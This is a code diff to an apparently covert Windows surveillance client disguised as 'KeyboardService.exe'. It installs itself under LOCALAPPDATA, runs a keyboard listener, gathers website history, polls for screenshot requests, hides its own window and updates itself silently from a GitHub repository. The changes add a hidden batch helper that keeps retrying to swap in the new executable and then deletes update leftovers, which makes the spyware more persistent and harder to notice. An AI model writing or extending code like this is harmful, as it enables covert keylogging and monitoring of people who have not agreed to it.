@@ -47,7 +47,7 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.2.6"
+APP_VERSION = "1.2.7"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1777,8 +1777,14 @@ def schedule_update(temporary_path, previous_version=None, new_version=None):
         "  timeout /t 1 /nobreak >nul",
         "  goto wait",
         ")",
-        f'move /y "{source_path}" "{target_path}" >nul',
+        ":replace",
+        f'move /y "{source_path}" "{target_path}" >nul 2>&1',
+        "if errorlevel 1 (",
+        "  timeout /t 1 /nobreak >nul",
+        "  goto replace",
+        ")",
         f'start "" "{target_path}" --post-update-success --previous-version "{previous}" --new-version "{updated}" --site-url "{SITE_URL}"',
+        f'del /f /q "{source_path}" >nul 2>&1',
         'del "%~f0"',
     ]
     with open(helper_path, "w", encoding="ascii", newline="\r\n") as helper:
@@ -1787,6 +1793,19 @@ def schedule_update(temporary_path, previous_version=None, new_version=None):
     startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
     startup_info.wShowWindow = 0
     subprocess.Popen(["cmd.exe", "/c", helper_path], close_fds=True, startupinfo=startup_info)
+
+
+def cleanup_update_artifacts():
+    stale_paths = [
+        os.path.join(INSTALL_DIR, f"{UPDATE_ASSET_NAME}.download"),
+        *glob.glob(os.path.join(INSTALL_DIR, "update_*.cmd")),
+    ]
+    for path in stale_paths:
+        try:
+            if os.path.abspath(path) != os.path.abspath(sys.argv[0]):
+                os.remove(path)
+        except OSError:
+            pass
 
 
 def check_for_updates(command_id=None):
@@ -1982,6 +2001,7 @@ def start_keyboard_listener():
 def run_client():
     if install_and_relaunch():
         sys.exit(0)
+    cleanup_update_artifacts()
     if POST_UPDATE_SUCCESS:
         send_successful_update_notice(PREVIOUS_VERSION, NEW_VERSION)
     hide_current_window()
